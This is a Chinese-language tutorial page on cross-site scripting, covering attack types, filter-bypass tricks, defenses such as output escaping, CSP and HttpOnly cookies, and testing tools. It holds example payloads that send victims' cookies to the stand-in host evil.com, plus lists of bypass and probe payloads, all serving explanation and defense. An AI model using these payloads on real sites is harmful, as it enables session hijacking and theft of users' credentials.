---
order: 50
title: XSS攻击
module: cybersecurity
category: 'eng-infra'
difficulty: intermediate
description: 跨站脚本攻击原理、分类、利用方式与防御策略详解。
author: fanquanpp
updated: '2026-08-01'
related:
  - cybersecurity/二进制安全与应急响应
  - cybersecurity/安全工具与实战
  - cybersecurity/安全模型与框架
  - cybersecurity/CSRF攻击
prerequisites:
  - cybersecurity/安全基础与防御
---

## 1. XSS 攻击原理

### 1.1 什么是 XSS

跨站脚本攻击（Cross-Site Scripting, XSS）是一种将恶意脚本注入到受信任网站中的攻击方式。攻击者利用 Web 应用对用户输入缺乏充分过滤/转义的漏洞，使恶意代码在其他用户的浏览器中执行。

### 1.2 攻击流程

```
1. 攻击者发现输入点 → 注入恶意脚本
2. 服务器未过滤 → 存储或反射恶意内容
3. 受害者访问页面 → 浏览器执行恶意脚本
4. 脚本窃取 Cookie/Session/敏感信息 → 发送到攻击者服务器
```

### 1.3 危害

| 危害类型    | 描述                                     |
| ----------- | ---------------------------------------- |
| Cookie 窃取 | 窃取用户 Session，实现会话劫持           |
| 键盘记录    | 记录用户输入的密码等敏感信息             |
| 钓鱼攻击    | 伪造登录表单骗取凭证                     |
| 网页篡改    | 修改页面内容，破坏品牌形象               |
| 蠕虫传播    | 自动发送含恶意代码的消息（如 Samy 蠕虫） |
| 挖矿劫持    | 在用户浏览器中运行加密货币挖矿脚本       |

## 2. XSS 分类

### 2.1 反射型 XSS（非持久型）

恶意脚本通过 URL 参数传递，服务器将其"反射"回响应页面。

**攻击示例**：

```
https://example.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>
```

**特点**：

- 一次性触发，需诱骗用户点击恶意链接
- 不存储在服务器端
- 常见于搜索、错误提示等页面

### 2.2 存储型 XSS（持久型）

恶意脚本被永久存储在服务器（数据库、文件等），每次访问都会执行。

**攻击示例**：

```html
<!-- 在评论区提交 -->
<div class="comment">
  <script>
    fetch('https://evil.com/steal?c=' + document.cookie);
  </script>
</div>
```

**特点**：

- 持久化存储，影响范围广
- 无需诱骗点击，用户正常浏览即可触发
- 危害最大，常见于评论、留言、用户资料

### 2.3 DOM 型 XSS

恶意脚本通过修改 DOM 环境触发，完全在客户端完成，不经过服务器。

**漏洞代码**：

```javascript
// 从 URL 提取内容直接写入 DOM
const name = new URLSearchParams(location.search).get('name');
document.getElementById('greeting').innerHTML = 'Hello, ' + name;
```

**攻击 URL**：

```
https://example.com/page?name=<img src=x onerror=alert(1)>
```

**特点**：

- 客户端漏洞，服务器日志无法记录
- WAF 难以检测
- 常见于 SPA 应用

## 3. XSS 绕过技术

### 3.1 基本绕过

| 过滤方式        | 绕过方法                                         |
| --------------- | ------------------------------------------------ |
| `<script>` 过滤 | `<img onerror>`、`<svg onload>`                  |
| 关键字大小写    | `<ScRiPt>`                                       |
| 空格/换行       | `<scr\nipt>`                                     |
| 编码绕过        | HTML 实体 `&#x3c;script&#x3e;`、Unicode `\u003c` |
| 双重编码        | `%253cscript%253e`                               |

### 3.2 高级绕过

```javascript
// 事件处理器
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>

// JavaScript 伪协议
<a href="javascript:alert(1)">click</a>

// SVG 标签
<svg><script>alert&#40;1&#41;</script></svg>

// 模板字面量
<script>alert`1`</script>
```

## 4. XSS 防御策略

### 4.1 输入过滤与输出转义

**HTML 转义**：

```javascript
function escapeHtml(str) {
  const map = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#x27;' };
  return str.replace(/[&<>"']/g, (c) => map[c]);
}
```

**不同上下文的转义**：

| 上下文     | 转义方式               |
| ---------- | ---------------------- |
| HTML 内容  | `&lt;` `&gt;` `&amp;`  |
| HTML 属性  | `&quot;` `&#x27;`      |
| JavaScript | Unicode 编码 `\uXXXX`  |
| URL        | `encodeURIComponent()` |
| CSS        | CSS 转义 `\XXXXXX`     |

### 4.2 内容安全策略（CSP）

```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc123'; style-src 'self'; img-src 'self' data:; connect-src 'self'; frame-ancestors 'none'
```

**CSP 关键指令**：

| 指令               | 作用               |
| ------------------ | ------------------ |
| `script-src`       | 控制脚本来源       |
| `style-src`        | 控制样式来源       |
| `img-src`          | 控制图片来源       |
| `default-src`      | 默认策略           |
| `nonce-`           | 基于随机数的白名单 |
| `'strict-dynamic'` | 信任动态加载的脚本 |

### 4.3 HttpOnly Cookie

```http
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```

- `HttpOnly`：JavaScript 无法读取 Cookie
- `Secure`：仅 HTTPS 传输
- `SameSite`：防止跨站请求携带 Cookie

### 4.4 现代框架防护

| 框架    | 防护机制                                           |
| ------- | -------------------------------------------------- |
| React   | JSX 自动转义，`dangerouslySetInnerHTML` 需显式使用 |
| Vue     | 模板自动转义，`v-html` 需显式使用                  |
| Angular | 默认转义，`DomSanitizer` 处理信任内容              |

## 5. XSS 检测与测试

### 5.1 自动化工具

| 工具       | 类型       | 特点            |
| ---------- | ---------- | --------------- |
| OWASP ZAP  | 代理扫描   | 开源、功能全面  |
| Burp Suite | 代理扫描   | 专业版功能强大  |
| XSSer      | 专用工具   | 自动化 XSS 检测 |
| Arachni    | Web 扫描器 | 支持 DOM XSS    |

### 5.2 手动测试 Payload

```
// 基础探测
<script>alert('XSS')</script>
"><script>alert(1)</script>
'><script>alert(1)</script>

// 事件处理器
" onmouseover="alert(1)
' onfocus=alert(1) autofocus='

// 编码绕过
%3Cscript%3Ealert(1)%3C/script%3E
&#60;script&#62;alert(1)&#60;/script&#62;
```

## 参考文献

OWASP Top 10：https://owasp.org/www-project-top-ten/
OWASP Cheat Sheets：https://cheatsheetseries.owasp.org/
NIST 网络安全框架：https://www.nist.gov/cyberframework
CWE 数据库：https://cwe.mitre.org/
PortSwigger Web Security Academy：https://portswigger.net/web-security

## 延伸阅读

密码学与证书，见 033-cybersecurity 模块文档。
Web 攻击与防御，见 033-cybersecurity 模块相关文档。
网络层安全，见 032-networking 模块。
黑马程序员 Bilibili 空间（https://space.bilibili.com/37974444 ）提供网络安全课程。

## 深度专题扩展

以下专题从不同角度深入本文主题，供有进阶需求的读者研读。每个专题独立成节，内容相互补充。

### 13.1 Web 攻击链详解

注入类：SQLi（参数化防御）、XSS（输出编码 + CSP）、命令注入（白名单）。
身份类：会话固定/劫持（HttpOnly + SameSite）、JWT 算法混淆（固定算法 + 校验）。
逻辑类：越权（IDOR）、竞态（TOCTOU）、支付篡改（服务端重算）。
防护纵深：WAF 拦截已知模式 + 应用层校验 + 监控异常。

### 13.2 零信任架构

核心原则：永不信任、始终验证；身份驱动策略而非网络位置。
组件：身份代理（IdP）、策略引擎（PDP）、网关（PEP）、微隔离。
落地路径：先高价值资产试点，逐步覆盖；配合 MFA 与设备合规。
成本与体验平衡：无密码（passkey）与连续评估是方向。

## 模块文档速查表

| 文档 | 主题 | 与本文的关联 |
| --- | --- | --- |
| 安全基础与防御 | 001-SecurityBasicsDefense | 本文的前置基础 |
| Web安全与渗透测试 | 002-WebSecurityPenetrationTesting | 本文的安全延伸 |
| 二进制安全与应急响应 | 003-BinarySecurityAndIncidentResponse | 本文的安全延伸 |
| 安全工具与实战 | 004-SecurityToolsPractice | 本文的综合应用 |
| XSS攻击 | 005-XSSAttack | 本文自身 |
| 安全模型与框架 | 006-SecurityModelFramework | 本文的安全延伸 |
| CSRF攻击 | 007-CSRFAttack | 本文的并列主题 |
| 密码学应用 | 008-CryptographyApplication | 本文的并列主题 |
| Web安全深度 | 009-WebSecurityDeep | 本文的安全延伸 |
| 安全运营中心 | 010-SOC | 本文的安全延伸 |
| SSRF攻击 | 011-SSRFAttack | 本文的并列主题 |
| 恶意代码分析 | 012-MalwareAnalysis | 本文的并列主题 |
| 云安全 | 013-CloudSecurity | 本文的安全延伸 |
| 对称加密 | 014-SymmetricEncryption | 本文的安全延伸 |
| 应急响应 | 015-IncidentResponse | 本文的并列主题 |
| 非对称加密 | 016-AsymmetricEncryption | 本文的安全延伸 |
| 哈希算法 | 017-HashAlgorithm | 本文的并列主题 |
| 安全开发 | 018-SecureDevelopment | 本文的安全延伸 |
| 合规与审计 | 019-ComplianceAudit | 本文的并列主题 |
| 数字证书 | 020-DigitalCertificate | 本文的并列主题 |
| HTTPS原理 | 021-HTTPSPrinciple | 本文的原理深化 |
| 渗透测试方法论 | 022-PenetrationTestingMethodology | 本文的并列主题 |
| 信息收集 | 023-InformationGathering | 本文的并列主题 |
| 漏洞扫描 | 024-VulnerabilityScan | 本文的并列主题 |
| 安全编码原则 | 025-SecureCodingPrinciples | 本文的安全延伸 |
| 输入验证 | 026-InputValidation | 本文的并列主题 |
| 认证与授权 | 027-AuthenticationAuthorization | 本文的并列主题 |
| OWASP-Top-10详解 | 028-OWASPTop10Detailed | 本文的并列主题 |
| XXE攻击 | 029-XXEAttack | 本文的并列主题 |
| 反序列化漏洞 | 030-DeserializationVulnerability | 本文的并列主题 |
| 零信任架构 | 031-ZeroTrustArchitecture | 本文的原理深化 |
| 身份与访问管理 | 032-IdentityAccessManagement | 本文的并列主题 |
| 安全基线 | 033-SecurityBaseline | 本文的安全延伸 |
| 漏洞扫描工具 | 034-VulnerabilityScanTools | 本文的并列主题 |
| WAF规则 | 035-WAFRule | 本文的并列主题 |
| Cybersecurity OpenSSL 证书管理 | 036-OpenSSLCert | 本文的并列主题 |
| Cybersecurity OpenSSL 加密解密 | 037-OpenSSLEncrypt | 本文的安全延伸 |
| Cybersecurity nmap 端口扫描 | 038-NmapScan | 本文的并列主题 |
| Cybersecurity 哈希工具 | 039-HashTools | 本文的并列主题 |
| Cybersecurity hashcat 密码破解 | 040-Hashcat | 本文的并列主题 |
| Cybersecurity GPG 加密与签名 | 041-GPGEncrypt | 本文的安全延伸 |
| Cybersecurity SSH 密钥管理 | 042-SSHKeys | 本文的并列主题 |
| Cybersecurity 密码哈希 | 043-PasswordHash | 本文的并列主题 |
| Cybersecurity SQL 注入检测与防御 | 044-SQLInjection | 本文的并列主题 |
| Cybersecurity XSS 防御 | 045-XSSDefense | 本文的并列主题 |
| Cybersecurity CSRF 防御命令与配置 | 046-CSRFDefense | 本文的并列主题 |
| Cybersecurity XXE 防御与检测 | 047-XXEDefense | 本文的并列主题 |
| Cybersecurity 命令注入防御与检测 | 048-CommandInjection | 本文的并列主题 |
| Cybersecurity OAuth2/OIDC 配置命令 | 049-OAuth2OIDC | 本文的并列主题 |
| Cybersecurity 防火墙配置(ufw/firewalld) | 050-FirewallConfig | 本文的并列主题 |
| Cybersecurity IDS/IPS 命令(Suricata/Snort) | 051-IDSIPSCommands | 本文的并列主题 |
| Cybersecurity Metasploit 命令(渗透测试) | 052-MetasploitCommands | 本文的并列主题 |
| Cybersecurity Burp Suite 命令行 | 053-BurpSuiteCLI | 本文的并列主题 |
| Cybersecurity Nikto Web 扫描 | 054-NiktoScan | 本文的并列主题 |
| Cybersecurity OpenVAS 漏洞扫描 | 055-OpenVASCommands | 本文的并列主题 |
| Cybersecurity SELinux/AppArmor 强制访问控制 | 056-SELinuxAppArmor | 本文的并列主题 |
| Cybersecurity AIDE 文件完整性检查 | 057-AIDEFileIntegrity | 本文的并列主题 |
| Cybersecurity auditd 审计命令 | 058-AuditdCommands | 本文的并列主题 |
| Cybersecurity 隐写术工具命令 | 059-SteganographyTools | 本文的并列主题 |
| Cybersecurity 逆向工程命令(radare2/ghidra CLI) | 060-ReverseEngineering | 本文的并列主题 |
